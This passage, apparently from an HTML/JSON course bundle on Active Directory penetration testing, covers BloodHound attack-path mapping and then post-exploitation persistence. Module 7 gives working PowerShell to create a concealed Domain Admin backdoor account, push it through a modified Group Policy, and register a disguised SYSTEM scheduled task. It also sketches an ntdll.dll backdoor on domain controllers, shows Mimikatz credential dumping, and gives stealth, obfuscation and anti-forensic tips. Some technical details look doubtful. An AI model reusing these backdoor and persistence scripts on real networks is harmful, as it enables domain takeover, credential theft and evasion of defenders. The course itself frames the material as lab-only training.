Obtain a service account hash and forge a Silver Ticket to access a specific service.</li>\n</ol>\n<p>Document all steps taken, including commands used, output generated, and any challenges encountered.  Analyze the effectiveness of each technique and identify potential mitigation strategies.</p>\n<p>This module provides a solid foundation for understanding and executing domain compromise techniques. Remember to practice these techniques in a safe and ethical lab environment. Good luck!</p>\n\n                </div>\n             </div>\n         ",
    "module-6": "\n             <div class=\"card main-content-card\"> <!-- Added main-content-card class -->\n                <h1>Module 6: module_6</h1> <!-- Use module title here -->\n                <div class=\"markdown-content\">\n                    <p>Alright! Let&#39;s dive deep into Module 6: Advanced AD Exploitation with BloodHound. I&#39;m excited to share this with you because BloodHound is a game-changer for understanding and exploiting Active Directory environments. This module will be packed with hands-on exercises and real-world examples.</p>\n<hr>\n<p><strong>Module 6: Advanced AD Exploitation with BloodHound</strong></p>\n<p><strong>Module Objective:</strong> Learn to use BloodHound for attack path mapping and identify complex attack vectors within the Active Directory environment.</p>\n<hr>\n<p><strong>Subtopic 1: Introduction to BloodHound</strong></p>\n<ul>\n<li><p><strong>What is BloodHound?</strong></p>\n<p>BloodHound is a powerful open-source Active Directory attack path mapping tool. It uses graph theory to visualize complex relationships within AD and identify the shortest paths to privileged accounts, like Domain Admin.  It&#39;s not just about finding vulnerabilities; it&#39;s about understanding how vulnerabilities connect to enable a full domain compromise.</p>\n</li>\n<li><p><strong>Why is BloodHound Important?</strong></p>\n<ul>\n<li><strong>Complexity:</strong>  Active Directory environments can be incredibly complex, with intricate group memberships, access control lists (ACLs), and delegation settings.  Humans can&#39;t easily track all these relationships.</li>\n<li><strong>Hidden Attack Paths:</strong>  BloodHound reveals attack paths that are difficult to identify manually, allowing attackers to exploit unexpected vulnerabilities.</li>\n<li><strong>Prioritization:</strong> BloodHound helps prioritize remediation efforts by highlighting the most critical vulnerabilities that lead to domain compromise.</li>\n<li><strong>Defensive Planning:</strong>  Understanding attack paths allows defenders to proactively harden their environment and break those paths.</li>\n</ul>\n</li>\n<li><p><strong>Key Components:</strong></p>\n<ul>\n<li><strong>SharpHound (Data Collector):</strong>  Gathers data from the Active Directory environment.  Think of it as the &quot;eyes and ears&quot; of BloodHound.  It can be run from a compromised workstation or a domain-joined machine.</li>\n<li><strong>BloodHound GUI (Neo4j):</strong> The graphical interface where you visualize and analyze the collected data. It uses a Neo4j graph database to store and query the information.</li>\n<li><strong>Neo4j (Graph Database):</strong> The underlying database that stores the collected data and allows for efficient relationship analysis.</li>\n</ul>\n</li>\n</ul>\n<hr>\n<p><strong>Subtopic 2: BloodHound Data Collection</strong></p>\n<ul>\n<li><p><strong>SharpHound: The BloodHound Data Collector</strong></p>\n<p>SharpHound is the recommended data collector because it&#39;s written in C# and is generally faster and more efficient than the older PowerShell-based collectors.</p>\n</li>\n<li><p><strong>Data Collection Methods:</strong></p>\n<ul>\n<li><strong>PowerShell (Legacy):</strong>  While still functional, the PowerShell collector is slower and less efficient than SharpHound.  We will focus on SharpHound.</li>\n<li><strong>C# (SharpHound):</strong>  The preferred method.  It&#39;s compiled, runs faster, and offers more flexibility.</li>\n</ul>\n</li>\n<li><p><strong>Downloading SharpHound:</strong></p>\n<p>You can download the latest version of SharpHound from the BloodHound GitHub repository:  <a href=\"https://github.com/BloodHoundAD/SharpHound\">https://github.com/BloodHoundAD/SharpHound</a>  Download the <code>SharpHound.exe</code> file.</p>\n</li>\n<li><p><strong>Running SharpHound:</strong></p>\n<p>You need to run SharpHound from a domain-joined machine or a machine with valid domain credentials.  Ideally, you&#39;d run it from a compromised workstation within your lab environment.</p>\n<ol>\n<li><p><strong>Copy <code>SharpHound.exe</code> to your target machine.</strong></p>\n</li>\n<li><p><strong>Open a command prompt or PowerShell window as a standard user (or the compromised user).</strong></p>\n</li>\n<li><p><strong>Run SharpHound with basic options:</strong></p>\n<pre><code class=\"language-powershell\">SharpHound.exe -c All\n</code></pre>\n<p>This command tells SharpHound to collect all available data.</p>\n</li>\n</ol>\n</li>\n<li><p><strong>SharpHound Options:</strong></p>\n<ul>\n<li><code>-c &lt;Collector&gt;</code>: Specifies the type of data to collect. Common collectors:<ul>\n<li><code>All</code>:  Collects all available data (users, groups, computers, sessions, trusts, GPOs, etc.). This is the most comprehensive option.</li>\n<li><code>UserOnly</code>: Collects only user data.</li>\n<li><code>GroupOnly</code>: Collects only group data.</li>\n<li><code>ComputerOnly</code>: Collects only computer data.</li>\n<li><code>Session</code>: Collects session information (who is logged in where).  Requires elevated privileges on the target machines.</li>\n<li><code>Trusts</code>: Collects trust relationships between domains.</li>\n<li><code>GPO</code>: Collects Group Policy Object information.</li>\n<li><code>ACL</code>: Collects Access Control List information.</li>\n</ul>\n</li>\n<li><code>-d &lt;Domain&gt;</code>: Specifies the domain to collect data from.  If omitted, SharpHound will attempt to discover the domain automatically.</li>\n<li><code>-u &lt;Username&gt;</code>: Specifies a username to use for authentication.</li>\n<li><code>-p &lt;Password&gt;</code>: Specifies a password to use for authentication.</li>\n<li><code>-gc &lt;DomainController&gt;</code>: Specifies a specific Global Catalog server to use. This can be helpful in large or multi-domain environments.</li>\n<li><code>-ns &lt;NameServer&gt;</code>: Specifies a DNS server to use for resolving domain names.</li>\n<li><code>-o &lt;OutputDirectory&gt;</code>: Specifies the directory where the collected data will be saved (as <code>.json</code> files). If omitted, it will save to the current directory.</li>\n<li><code>-ExcludeDCs</code>: Excludes Domain Controllers from session collection. Useful in very large environments where querying DCs for session data can cause issues.</li>\n<li><code>-Stealth</code>: Uses a stealthy collection method that avoids some common detection techniques (slower).</li>\n<li><code>-Delay &lt;Milliseconds&gt;</code>: Adds a delay between requests to avoid overwhelming the target systems.</li>\n</ul>\n</li>\n<li><p><strong>Example: Collecting Data with Specific Credentials:</strong></p>\n<pre><code class=\"language-powershell\">SharpHound.exe -c All -u &quot;compromised_user&quot; -p &quot;password123&quot; -d &quot;example.local&quot; -o &quot;C:\\BloodHoundData&quot;\n</code></pre>\n</li>\n<li><p><strong>Output Files:</strong></p>\n<p>SharpHound will generate several <code>.json</code> files in the specified output directory (or the current directory if <code>-o</code> is omitted). These files contain the collected data:</p>\n<ul>\n<li><code>computers.json</code></li>\n<li><code>domains.json</code></li>\n<li><code>groups.json</code></li>\n<li><code>users.json</code></li>\n<li><code>sessions.json</code> (if the Session collector was used)</li>\n<li><code>trusts.json</code> (if the Trusts collector was used)</li>\n<li><code>gpos.json</code> (if the GPO collector was used)</li>\n<li><code>acls.json</code> (if the ACL collector was used)</li>\n</ul>\n</li>\n<li><p><strong>Optimizing Data Collection for Large Environments:</strong></p>\n<ul>\n<li><strong>Targeted Collection:</strong> Instead of collecting all data at once, start with specific collectors (e.g., <code>UserOnly</code>, <code>GroupOnly</code>) to reduce the initial load.</li>\n<li><strong>Domain Controller Exclusion:</strong> Use the <code>-ExcludeDCs</code> flag to avoid querying domain controllers for session information.</li>\n<li><strong>Global Catalog Specification:</strong>  Use the <code>-gc</code> flag to target a specific Global Catalog server.</li>\n<li><strong>Delay:</strong> Use the <code>-Delay</code> flag to add a delay between requests.</li>\n<li><strong>Stealth Mode:</strong> Use the <code>-Stealth</code> flag to reduce the chances of detection.</li>\n</ul>\n</li>\n</ul>\n<hr>\n<p><strong>Subtopic 3: BloodHound Analysis</strong></p>\n<ul>\n<li><p><strong>Installing Neo4j:</strong></p>\n<p>BloodHound uses the Neo4j graph database. You need to install Neo4j on your analysis machine (the machine where you&#39;ll run the BloodHound GUI).</p>\n<ol>\n<li><strong>Download Neo4j:</strong>  Download the Neo4j Desktop version from the Neo4j website: <a href=\"https://neo4j.com/download-center/\">https://neo4j.com/download-center/</a></li>\n<li><strong>Install Neo4j Desktop:</strong> Follow the installation instructions for your operating system.</li>\n<li><strong>Create a Database:</strong>  Open Neo4j Desktop and create a new database.  Choose a password (remember this password!).  Start the database.</li>\n</ol>\n</li>\n<li><p><strong>Installing BloodHound GUI:</strong></p>\n<p>You can download the BloodHound GUI from the BloodHound GitHub repository: <a href=\"https://github.com/BloodHoundAD/BloodHound\">https://github.com/BloodHoundAD/BloodHound</a>  Download the appropriate version for your operating system.</p>\n</li>\n<li><p><strong>Connecting BloodHound to Neo4j:</strong></p>\n<ol>\n<li><strong>Open the BloodHound GUI.</strong></li>\n<li><strong>Enter the Neo4j connection details:</strong><ul>\n<li><strong>URI:</strong> <code>bolt://localhost:7687</code></li>\n<li><strong>Username:</strong> <code>neo4j</code></li>\n<li><strong>Password:</strong> The password you set when creating the Neo4j database.</li>\n</ul>\n</li>\n<li><strong>Click &quot;Upload Data&quot; and select the <code>.json</code> files that SharpHound generated.</strong>  You can select multiple files at once.</li>\n</ol>\n</li>\n<li><p><strong>Understanding the BloodHound Graph Database:</strong></p>\n<p>BloodHound represents Active Directory objects (users, groups, computers, domains, GPOs) as <em>nodes</em> in a graph.  Relationships between these objects (e.g., user belongs to group, computer is managed by GPO) are represented as <em>edges</em> connecting the nodes.</p>\n</li>\n<li><p><strong>Basic BloodHound Queries:</strong></p>\n<p>BloodHound provides a query language based on Cypher (Neo4j&#39;s query language).  However, BloodHound also provides several built-in queries that make common tasks easier.  Here are some examples:</p>\n<ul>\n<li><strong>&quot;Find shortest paths to Domain Admins&quot;:</strong>  This is the most common and important query.  It shows you the shortest sequence of actions required to gain Domain Admin privileges.</li>\n<li><strong>&quot;Find all domain admins&quot;:</strong> Lists all accounts with Domain Admin privileges.</li>\n<li><strong>&quot;Find Principals with DCSync rights&quot;:</strong> Identifies accounts that can replicate the entire Active Directory database.  These accounts are effectively domain admins.</li>\n<li><strong>&quot;Find all computers where user X is an admin&quot;:</strong>  Shows you all the computers where a specific user has local administrator privileges.</li>\n<li><strong>&quot;Find all users who can reset password of user Y&quot;:</strong> Shows which users have the permissions to reset the password of another user, a common attack vector.</li>\n</ul>\n</li>\n<li><p><strong>Identifying Shortest Paths to Domain Admin:</strong></p>\n<ol>\n<li><strong>Click the &quot;Shortest Paths to Domain Admins&quot; button.</strong></li>\n<li><strong>BloodHound will display a graph showing the shortest paths from your current position (or any selected node) to a Domain Admin account.</strong>  The paths are represented as a series of nodes and edges.</li>\n<li><strong>Click on the edges to see the actions required to traverse that edge (e.g., &quot;User X is member of Group Y&quot;, &quot;Computer Z is managed by GPO A&quot;).</strong></li>\n</ol>\n</li>\n<li><p><strong>Discovering Hidden Attack Vectors:</strong></p>\n<p>BloodHound can reveal attack vectors that are not immediately obvious.  For example:</p>\n<ul>\n<li><strong>Unintended Delegation:</strong>  A user might have unintended delegation rights to a service account, allowing them to impersonate that account and gain access to sensitive resources.</li>\n<li><strong>Circular Group Memberships:</strong>  A user might be a member of a group that is a member of another group, which ultimately grants them elevated privileges.</li>\n<li><strong>Misconfigured GPOs:</strong>  A GPO might be configured to allow a specific user or group to install software or execute commands on a large number of machines.</li>\n<li><strong>ACL Abuse:</strong>  A user might have write access to a specific object in Active Directory, allowing them to modify its attributes and gain control over it.</li>\n</ul>\n</li>\n<li><p><strong>Analyzing Group Memberships, GPOs, and ACLs:</strong></p>\n<p>BloodHound allows you to drill down into the details of group memberships, GPOs, and ACLs to identify potential vulnerabilities.</p>\n<ul>\n<li><strong>Group Memberships:</strong>  You can see which users are members of which groups, and which privileges those groups have.</li>\n<li><strong>GPOs:</strong>  You can see which computers are managed by which GPOs, and which settings are configured in those GPOs.  Look for GPOs that allow script execution or software installation.</li>\n<li><strong>ACLs:</strong> You can see which users or groups have access to specific objects in Active Directory, and what permissions they have.  Look for unexpected write or modify permissions.</li>\n</ul>\n</li>\n</ul>\n<hr>\n<p><strong>Subtopic 4: Domain Admin Escalation</strong></p>\n<ul>\n<li><p><strong>Exploiting Identified Attack Paths to Gain Domain Administrator Privileges:</strong></p>\n<p>Once you&#39;ve identified an attack path in BloodHound, you need to exploit it to gain Domain Admin privileges.  This typically involves a series of actions:</p>\n<ol>\n<li><strong>Compromise an initial user account:</strong>  This might involve password spraying, credential stuffing, or exploiting a vulnerability on a workstation.</li>\n<li><strong>Move laterally to other systems:</strong>  Use Pass-the-Hash, Pass-the-Ticket, or other lateral movement techniques to gain access to more privileged accounts or systems.</li>\n<li><strong>Exploit misconfigured delegation settings:</strong>  Impersonate a service account that has elevated privileges.</li>\n<li><strong>Abuse group memberships:</strong>  Gain membership in a group that has Domain Admin privileges.</li>\n<li><strong>Modify GPOs:</strong>  Modify a GPO to execute malicious code on a large number of machines.</li>\n</ol>\n</li>\n<li><p><strong>Using BloodHound to Identify Vulnerable Accounts and Systems:</strong></p>\n<p>BloodHound can help you identify vulnerable accounts and systems by highlighting:</p>\n<ul>\n<li><strong>Accounts with weak or default passwords:</strong>  These accounts are easy targets for password spraying.</li>\n<li><strong>Systems with known vulnerabilities:</strong>  These systems can be exploited to gain initial access or move laterally.</li>\n<li><strong>Accounts with excessive privileges:</strong>  These accounts are potential targets for privilege escalation attacks.</li>\n<li><strong>Systems with misconfigured security settings:</strong>  These systems might be vulnerable to a variety of attacks.</li>\n</ul>\n</li>\n</ul>\n<hr>\n<p><strong>Subtopic 5: Advanced BloodHound Queries</strong></p>\n<ul>\n<li><p><strong>Custom Queries for Specific Attack Scenarios:</strong></p>\n<p>BloodHound&#39;s Cypher query language allows you to create custom queries for specific attack scenarios. Here are some examples:</p>\n<ul>\n<li><p><strong>Find all users who can write to a specific GPO:</strong></p>\n<pre><code class=\"language-cypher\">MATCH (u:User)-[:MemberOf]-&gt;(g:Group)-[:AdminTo]-&gt;(gpo:GPO)\nWHERE gpo.name = &quot;YourGPOName&quot;\nRETURN u, g, gpo\n</code></pre>\n</li>\n<li><p><strong>Find all computers where a specific user is logged in and is also a local administrator:</strong></p>\n<pre><code class=\"language-cypher\">MATCH (u:User)-[:MemberOf]-&gt;(g:Group {name: &quot;Administrators&quot;})&lt;-[:LocalAdmin]-(c:Computer)-[:HasSession]-&gt;(u)\nWHERE u.name = &quot;YourUsername&quot;\nRETURN u, c\n</code></pre>\n</li>\n<li><p><strong>Find all users who can reset the password of a Domain Admin:</strong></p>\n<pre><code class=\"language-cypher\">MATCH (da:User {domain: &quot;YOURDOMAIN&quot;, isadmin: true})\nMATCH (u:User)-[:CanChangePassword]-&gt;(da)\nRETURN u, da\n</code></pre>\n<p><strong>Note:</strong> Replace <code>YOURDOMAIN</code> with your actual domain name.</p>\n</li>\n</ul>\n</li>\n<li><p><strong>Reporting and Visualization of Attack Paths:</strong></p>\n<p>BloodHound allows you to generate reports and visualizations of attack paths.  You can export the graph as an image or a JSON file. You can also copy the Cypher query to share with others.</p>\n</li>\n</ul>\n<hr>\n<p><strong>Subtopic 6: Case Study: Analyzing Real-World BloodHound Findings and Their Impact on Security</strong></p>\n<ul>\n<li><p><strong>Example Scenario:</strong></p>\n<p>A large organization has a complex Active Directory environment with multiple domains, forests, and trust relationships.  A penetration test reveals that a low-privileged user account can gain Domain Admin privileges through a series of misconfigured delegation settings and group memberships.</p>\n<ol>\n<li><strong>Initial Access:</strong> The attacker compromises a low-privileged user account through password spraying.</li>\n<li><strong>BloodHound Analysis:</strong> The attacker uses SharpHound to collect data from the Active Directory environment and uploads the data to BloodHound.</li>\n<li><strong>Attack Path Discovery:</strong> BloodHound identifies a path from the compromised user account to a Domain Admin account.  The path involves:<ul>\n<li>The user being a member of a group that has write access to a specific service account.</li>\n<li>The service account having unconstrained delegation enabled.</li>\n<li>A Domain Controller trusting the service account for delegation.</li>\n</ul>\n</li>\n<li><strong>Exploitation:</strong> The attacker exploits the misconfigured delegation settings to impersonate the service account and gain access to the Domain Controller.  From there, they can dump the Domain Admin credentials and gain full control of the Active Directory environment.</li>\n<li><strong>Impact:</strong> The attacker can access sensitive data, disrupt business operations, and compromise the entire organization.</li>\n</ol>\n</li>\n<li><p><strong>Lessons Learned:</strong></p>\n<ul>\n<li>Complex Active Directory environments are difficult to secure manually.</li>\n<li>BloodHound is a powerful tool for identifying hidden attack paths.</li>\n<li>Misconfigured delegation settings and group memberships are common vulnerabilities.</li>\n<li>Proactive security measures are essential to prevent domain compromise.</li>\n</ul>\n</li>\n</ul>\n<hr>\n<p><strong>Module Project:</strong></p>\n<ol>\n<li><p><strong>Install and Configure BloodHound:</strong> Install Neo4j and the BloodHound GUI in your lab environment.</p>\n</li>\n<li><p><strong>Collect Data:</strong> Use SharpHound to collect data from your Active Directory domain.  Experiment with different collectors and options.</p>\n</li>\n<li><p><strong>Analyze Data:</strong> Analyze the data in BloodHound to identify the shortest path to domain admin.</p>\n</li>\n<li><p><strong>Exploit Attack Path:</strong> Exploit the identified attack path to gain domain administrator privileges.  Document your steps.</p>\n</li>\n<li><p><strong>Automate Data Collection:</strong> Create a PowerShell script that automates the BloodHound data collection process and highlights critical attack paths.  The script should:</p>\n<ul>\n<li>Accept parameters for the domain, username, and password.</li>\n<li>Run SharpHound with the specified parameters.</li>\n<li>Parse the SharpHound output and identify the shortest path to domain admin.</li>\n<li>Generate a report that summarizes the findings.</li>\n</ul>\n</li>\n</ol>\n<p>Here&#39;s a starting point for your PowerShell script:</p>\n<pre><code class=\"language-powershell\">param (\n    [string]$Domain = $(Read-Host &quot;Enter Domain Name&quot;),\n    [string]$Username = $(Read-Host &quot;Enter Username&quot;),\n    [string]$Password = $(Read-Host &quot;Enter Password&quot;)\n)\n\n# Define the SharpHound executable path\n$SharpHoundPath = &quot;.\\SharpHound.exe&quot;  # Adjust if SharpHound is in a different location\n\n# Define the output directory\n$OutputDirectory = &quot;.\\BloodHoundData&quot;\n\n# Create the output directory if it doesn&#39;t exist\nif (!(Test-Path -Path $OutputDirectory)) {\n    New-Item -ItemType Directory -Path $OutputDirectory\n}\n\n# Construct the SharpHound command\n$SharpHoundCommand = &quot;$SharpHoundPath -c All -d $Domain -u $Username -p $Password -o $OutputDirectory&quot;\n\n# Execute the SharpHound command\nWrite-Host &quot;Running SharpHound...&quot;\nInvoke-Expression $SharpHoundCommand\n\nWrite-Host &quot;SharpHound data collection complete.  Data saved to $OutputDirectory&quot;\n\n# Basic path identification (This is a placeholder and would need significant parsing and analysis of the JSON files)\nWrite-Host &quot;Analyzing data (Placeholder - Requires JSON parsing)&quot;\nWrite-Host &quot;This script needs to be expanded to parse the JSON output from SharpHound and identify critical attack paths.&quot;\nWrite-Host &quot;Consider using PowerShell&#39;s ConvertFrom-Json cmdlet to read the JSON files and then query the data.&quot;\n\nWrite-Host &quot;Script Complete.&quot;\n</code></pre>\n<p><strong>Important Considerations for the Project:</strong></p>\n<ul>\n<li><strong>Error Handling:</strong>  Add error handling to your script to gracefully handle situations where SharpHound fails to collect data or the specified parameters are invalid.</li>\n<li><strong>JSON Parsing:</strong>  Learn how to use PowerShell&#39;s <code>ConvertFrom-Json</code> cmdlet to parse the JSON files that SharpHound generates.  This will allow you to extract the data you need to identify attack paths.  This is the most challenging, but most rewarding part of the project. Focus on parsing the <code>computers.json</code>, <code>users.json</code>, and <code>groups.json</code> files to build a basic understanding of the relationships.</li>\n<li><strong>Attack Path Identification:</strong>  Develop an algorithm to identify the shortest path to domain admin based on the parsed JSON data.  This might involve using PowerShell&#39;s array manipulation and filtering capabilities.  (This is an advanced task, aim for basic functionality first).</li>\n<li><strong>Reporting:</strong>  Generate a clear and concise report that summarizes the findings, including the shortest path to domain admin and any other critical vulnerabilities.</li>\n</ul>\n<p>This module is challenging but incredibly rewarding. By the end, you&#39;ll have a deep understanding of how BloodHound can be used to identify and exploit complex attack vectors in Active Directory environments.  Good luck!  And remember, ethical hacking is key.  Only use these techniques in a controlled lab environment with proper authorization.</p>\n\n                </div>\n             </div>\n         ",
    "module-7": "\n             <div class=\"card main-content-card\"> <!-- Added main-content-card class -->\n                <h1>Module 7: module_7</h1> <!-- Use module title here -->\n                <div class=\"markdown-content\">\n                    <p>Okay, let&#39;s dive deep into Module 7: Post-Exploitation in Active Directory - Maintaining Access &amp; Persistence. This is where we solidify our control after breaching the perimeter. We&#39;ll be covering how to establish backdoors, dump credentials, and evade detection. Remember, this is for ethical hacking purposes only!</p>\n<hr>\n<p><strong>Module 7: Post-Exploitation in Active Directory - Maintaining Access &amp; Persistence</strong></p>\n<p><strong>Module Objective:</strong> Learn and apply techniques to maintain access and establish persistence within the compromised Active Directory environment.</p>\n<hr>\n<p><strong>Subtopic 1: Understanding Post-Exploitation - Securing Your Foothold and Maintaining Control</strong></p>\n<ul>\n<li><p><strong>What is Post-Exploitation?</strong>  It&#39;s the phase after successfully exploiting a vulnerability and gaining access to a system or network. The goal is now to solidify that access, gather more information, and prepare for long-term control or further exploitation.  Think of it as setting up shop <em>inside</em> the target.</p>\n</li>\n<li><p><strong>Why is it important?</strong>  Initial access can be fleeting.  A system reboot, a patch, or even a vigilant admin can kick you out.  Post-exploitation techniques help ensure you can regain access even after such events.  It also allows you to gather more information, escalate privileges further, and move laterally if you haven&#39;t already achieved your objectives.</p>\n</li>\n<li><p><strong>Key Considerations:</strong></p>\n<ul>\n<li><strong>Stealth:</strong>  The more noise you make, the more likely you are to be detected.  Choose techniques that minimize your footprint.</li>\n<li><strong>Persistence:</strong>  Ensure you can regain access even after a reboot or other system changes.</li>\n<li><strong>Privilege Escalation:</strong>  If you haven&#39;t already achieved the necessary privileges (e.g., Domain Admin), continue working towards that goal.</li>\n<li><strong>Data Exfiltration:</strong>  If your objective includes stealing data, this is the time to plan and execute that phase.</li>\n</ul>\n</li>\n</ul>\n<hr>\n<p><strong>Subtopic 2: Backdoors</strong></p>\n<p>Backdoors provide a way to regain access to a compromised system or network.  They are essentially secret entry points that bypass normal authentication mechanisms.</p>\n<ul>\n<li><p><strong>Types of Backdoors:</strong></p>\n<ul>\n<li><p><strong>Creating User Accounts with Hidden Privileges:</strong> This is a classic and often effective technique.</p>\n<ul>\n<li><p><strong>Method:</strong> Create a new user account with Domain Admin privileges (or any other necessary level of access) but make it less conspicuous.</p>\n</li>\n<li><p><strong>Example (PowerShell):</strong></p>\n<pre><code class=\"language-powershell\"># Create a new user account\nNew-ADUser -Name &quot;SVC_Backup&quot; -SamAccountName &quot;SVC_Backup&quot; -AccountPassword (ConvertTo-SecureString &quot;P@sswOrd123!&quot; -AsPlainText -Force) -PasswordNeverExpires $true -Enabled $true\n\n# Add the user to the Domain Admins group\nAdd-ADGroupMember -Identity &quot;Domain Admins&quot; -Members &quot;SVC_Backup&quot;\n</code></pre>\n</li>\n<li><p><strong>Stealth Considerations:</strong></p>\n<ul>\n<li>Give the account a non-suspicious name (e.g., <code>SVC_Backup</code>, <code>HelpDesk_Admin</code>).</li>\n<li>Set a complex password.</li>\n<li>Consider hiding the account by removing it from the Global Address List (GAL) in Exchange, if applicable.</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p><strong>Modifying GPOs to Execute Malicious Code:</strong> Group Policy Objects (GPOs) can be a powerful way to deploy backdoors across an entire domain.</p>\n<ul>\n<li><p><strong>Method:</strong> Edit an existing GPO (or create a new one) to execute a script or program on target machines.</p>\n</li>\n<li><p><strong>Example (PowerShell - Modifying an existing GPO to run a script):</strong></p>\n<pre><code class=\"language-powershell\">#Requires -Modules ActiveDirectory\n\n# Find a suitable GPO (e.g., a GPO that applies to all computers in the domain)\n$GPO = Get-GPO -All | Where-Object {$_.DisplayName -like &quot;*Default Domain Policy*&quot;}\n\n# Create a script to be executed (e.g., creating a backdoor user)\n$ScriptContent = @&quot;\nNew-ADUser -Name &quot;SVC_Backup&quot; -SamAccountName &quot;SVC_Backup&quot; -AccountPassword (ConvertTo-SecureString &quot;P@sswOrd123!&quot; -AsPlainText -Force) -PasswordNeverExpires \\$true -Enabled \\$true\nAdd-ADGroupMember -Identity &quot;Domain Admins&quot; -Members &quot;SVC_Backup&quot;\n&quot;@\n\n# Save the script to a file share accessible by all machines\n$ScriptPath = &quot;\\\\\\\\dc.example.com\\\\NETLOGON\\\\backdoor.ps1&quot;\n$ScriptContent | Out-File -FilePath $ScriptPath\n\n# Set the GPO to execute the script on startup\nSet-GPPrefRegistryValue -Name $GPO.DisplayName -Context Computer -Action Create -Type String -Key &quot;HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run&quot; -ValueName &quot;BackdoorScript&quot; -Value $ScriptPath\n\n#Force the GPO update to take effect.\ngpupdate /force\n</code></pre>\n</li>\n<li><p><strong>Stealth Considerations:</strong></p>\n<ul>\n<li>Choose a GPO that already applies to a wide range of computers.</li>\n<li>Hide the script in a seemingly legitimate location.</li>\n<li>Use PowerShell obfuscation techniques to make the script harder to understand.</li>\n<li>Set the script to run only once (e.g., using a registry key check).</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p><strong>Installing Persistent Backdoors on Domain Controllers:</strong> Domain Controllers (DCs) are the keys to the kingdom.  A persistent backdoor on a DC gives you ultimate control.</p>\n<ul>\n<li><p><strong>Method:</strong> Modify system files or services on the DC to create a hidden entry point.  A classic technique involves modifying the <code>lsass.exe</code> process to allow for credential dumping (covered later). However, for persistence, we need something more reliable. Another approach is to modify the <code>ntdll.dll</code> to allow for backdoor access.</p>\n</li>\n<li><p><strong>Disclaimer:</strong>  Modifying system files on a DC is extremely risky and can cause serious stability issues.  Proceed with extreme caution and only in a lab environment!</p>\n</li>\n<li><p><strong>Example (Conceptual - Modifying <code>ntdll.dll</code> requires advanced assembly knowledge and is beyond the scope of a simple example, but here&#39;s the concept):</strong></p>\n<ol>\n<li><strong>Disassemble <code>ntdll.dll</code>:</strong> Use a disassembler like IDA Pro or Ghidra to analyze the DLL&#39;s code.</li>\n<li><strong>Identify a suitable function:</strong> Find a function that is frequently called and doesn&#39;t have critical dependencies.</li>\n<li><strong>Inject your code:</strong>  Insert your backdoor code into the chosen function. This might involve creating a new thread or executing a shellcode.</li>\n<li><strong>Reassemble the DLL:</strong> Reassemble the modified DLL.</li>\n<li><strong>Replace the original <code>ntdll.dll</code>:</strong> Replace the original DLL with your modified version.  This requires SYSTEM privileges and might involve stopping related services.</li>\n<li><strong>Example of a simple backdoor (very basic, replace with more sophisticated code):</strong></li>\n</ol>\n<pre><code class=\"language-c++\">// Injected into ntdll.dll\nvoid MyBackdoorFunction() {\n    // This is a very simplistic example.\n    // A real backdoor would involve more complex logic,\n    // such as listening on a port for incoming connections\n    // or executing commands based on specific triggers.\n    system(&quot;net user BackdoorUser P@ssword123! /add /domain&quot;);\n    system(&quot;net localgroup \\&quot;Domain Admins\\&quot; BackdoorUser /add /domain&quot;);\n}\n</code></pre>\n</li>\n<li><p><strong>Stealth Considerations:</strong></p>\n<ul>\n<li>Choose a less critical system file.</li>\n<li>Use code obfuscation techniques to hide your backdoor code.</li>\n<li>Implement anti-forensic measures to remove traces of your modifications.</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p><strong>Using Scheduled Tasks for Persistence:</strong> Scheduled Tasks can be used to execute code at specific times or events.</p>\n<ul>\n<li><p><strong>Method:</strong> Create a scheduled task that runs a malicious script or program.</p>\n</li>\n<li><p><strong>Example (PowerShell):</strong></p>\n<pre><code class=\"language-powershell\"># Create a scheduled task to run a script every day at 3 AM\n$Action = New-ScheduledTaskAction -Execute &quot;powershell.exe&quot; -Argument &quot;-ExecutionPolicy Bypass -File C:\\Windows\\Temp\\backdoor.ps1&quot;\n$Trigger = New-ScheduledTaskTrigger -Daily -At 3am\n$Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit ([TimeSpan]::FromHours(24)) -RestartCount 3 -RestartInterval ([TimeSpan]::FromMinutes(1))\nRegister-ScheduledTask -TaskName &quot;System Maintenance&quot; -Action $Action -Trigger $Trigger -Settings $Settings -Description &quot;Performs routine system maintenance.&quot; -User &quot;NT AUTHORITY\\SYSTEM&quot; -RunLevel Highest\n</code></pre>\n</li>\n<li><p><strong>Stealth Considerations:</strong></p>\n<ul>\n<li>Give the task a non-suspicious name (e.g., &quot;System Maintenance&quot;).</li>\n<li>Set the task to run at a time when the system is likely to be idle.</li>\n<li>Hide the script in a seemingly legitimate location.</li>\n<li>Use PowerShell obfuscation techniques to make the script harder to understand.</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<hr>\n<p><strong>Subtopic 3: Credential Dumping</strong></p>\n<p>Credential dumping is the process of extracting usernames and passwords (or their hashes) from a compromised system.  This information can be used for lateral movement, privilege escalation, or accessing sensitive data.</p>\n<ul>\n<li><p><strong>Mimikatz:</strong>  The most popular and powerful tool for credential dumping.</p>\n<ul>\n<li><p><strong>Functionality:</strong>  Mimikatz can extract plaintext passwords, NTLM hashes, Kerberos tickets, and other sensitive information from memory.</p>\n</li>\n<li><p><strong>Usage (Example):</strong></p>\n<pre><code>mimikatz # privilege::debug\nmimikatz # sekurlsa::logonpasswords\n</code></pre>\n</li>\n<li><p><strong><code>lsass.exe</code> Process:</strong>  <code>lsass.exe</code> (Local Security Authority Subsystem Service) is a critical Windows process that handles user authentication.  It stores passwords and other credentials in memory.  Mimikatz targets <code>lsass.exe</code> to extract this information.</p>\n</li>\n</ul>\n</li>\n<li><p><strong>Protecting Credentials from Dumping:</strong></p>\n<ul>\n<li><p><strong>Credential Guard:</strong>  Uses virtualization-based security to isolate <code>lsass.exe</code> and protect it from credential theft attacks.  Requires specific hardware and software requirements.</p>\n</li>\n<li><p><strong>LSA Protection:</strong>  Prevents unauthorized processes from accessing <code>lsass.exe</code>.  Can be enabled through registry settings.</p>\n<ul>\n<li><p><strong>Enabling LSA Protection (Registry):</strong></p>\n<pre><code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\nValue Name: RunAsPPL\nValue Type: REG_DWORD\nValue Data: 1\n</code></pre>\n</li>\n<li><p><strong>Note:</strong> Enabling LSA Protection can break compatibility with some applications. Test thoroughly before deploying in a production environment.</p>\n</li>\n</ul>\n</li>\n<li><p><strong>Other Mitigation 